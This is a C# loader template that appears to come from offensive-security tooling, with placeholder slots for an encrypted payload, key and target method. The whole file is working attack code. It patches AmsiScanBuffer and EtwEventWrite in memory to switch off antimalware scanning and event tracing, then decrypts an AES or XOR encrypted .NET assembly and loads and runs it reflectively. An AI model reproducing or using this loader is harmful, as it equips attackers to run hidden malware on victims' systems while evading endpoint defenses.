using System;
using System.Reflection;
using System.Runtime.InteropServices;
// USING_CRYPTO_START
using System.Security.Cryptography;
// USING_CRYPTO_END

[DllImport("kernel32.dll")]
static IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
static IntPtr LoadLibrary(string lpFileName);

[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
static IntPtr GetModuleHandle(string lpModuleName);

[DllImport("kernel32.dll")]
static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
    uint flNewProtect, out uint lpflOldProtect);

const uint PAGE_EXECUTE_READWRITE = 0x40;

void PatchAmsi()
{
    try
    {
        IntPtr hAmsi = LoadLibrary("amsi.dll");
        if (hAmsi == IntPtr.Zero) return;
        IntPtr addr = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (addr == IntPtr.Zero) return;
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
        Marshal.Copy(patch, 0, addr, patch.Length);
        uint tmp;
        VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out tmp);
    }
    catch { }
}

void PatchEtw()
{
    try
    {
        IntPtr hNtdll = GetModuleHandle("ntdll.dll");
        if (hNtdll == IntPtr.Zero) return;
        IntPtr addr = GetProcAddress(hNtdll, "EtwEventWrite");
        if (addr == IntPtr.Zero) return;
        byte[] patch = { 0x33, 0xC0, 0xC3 };
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
        Marshal.Copy(patch, 0, addr, patch.Length);
        uint tmp;
        VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out tmp);
    }
    catch { }
}

string ENCRYPTED_B64 = "YOURPAYLOADHERE";
string KEY_B64 = "YOURKEYHERE";

string TARGET_TYPE = "YOURTYPEHERE";
string TARGET_METHOD = "YOURMETHODHERE";

string[] assemblyArgs = new string[] {
    // YOURARGS
};

PatchEtw();
PatchAmsi();

// DECRYPT_AES_START
string IV_B64 = "YOURIVHERE";

byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);
byte[] key = Convert.FromBase64String(KEY_B64);
byte[] iv = Convert.FromBase64String(IV_B64);

byte[] clearAssembly;
using (RijndaelManaged aes = new RijndaelManaged())
{
    aes.Key = key;
    aes.IV = iv;
    aes.Mode = CipherMode.CBC;
    aes.Padding = PaddingMode.PKCS7;
    ICryptoTransform decryptor = aes.CreateDecryptor();
    clearAssembly = decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
}

Array.Clear(encrypted, 0, encrypted.Length);
Array.Clear(key, 0, key.Length);
Array.Clear(iv, 0, iv.Length);
// DECRYPT_AES_END

// DECRYPT_XOR_START
// byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);
// byte[] key = Convert.FromBase64String(KEY_B64);
// byte[] clearAssembly = new byte[encrypted.Length];
// for (int i = 0; i < encrypted.Length; i++)
//     clearAssembly[i] = (byte)(encrypted[i] ^ key[i % key.Length]);
//
// Array.Clear(encrypted, 0, encrypted.Length);
// Array.Clear(key, 0, key.Length);
// DECRYPT_XOR_END

Assembly asm = Assembly.Load(clearAssembly);
Array.Clear(clearAssembly, 0, clearAssembly.Length);

if (TARGET_TYPE.Length > 0 && TARGET_METHOD.Length > 0)
{
    Type t = asm.GetType(TARGET_TYPE);
    BindingFlags flags = BindingFlags.Public | BindingFlags.NonPublic
        | BindingFlags.Static | BindingFlags.Instance;
    MethodInfo method = t.GetMethod(TARGET_METHOD, flags);
    if (method.IsStatic)
        method.Invoke(null, new object[0]);
    else
    {
        object instance = Activator.CreateInstance(t);
        method.Invoke(instance, new object[0]);
    }
}
else
{
    MethodInfo entry = asm.EntryPoint;
    if (entry != null)
    {
        ParameterInfo[] prms = entry.GetParameters();
        if (prms.Length == 0)
            entry.Invoke(null, new object[0]);
        else
            entry.Invoke(null, new object[] { assemblyArgs });
    }
}
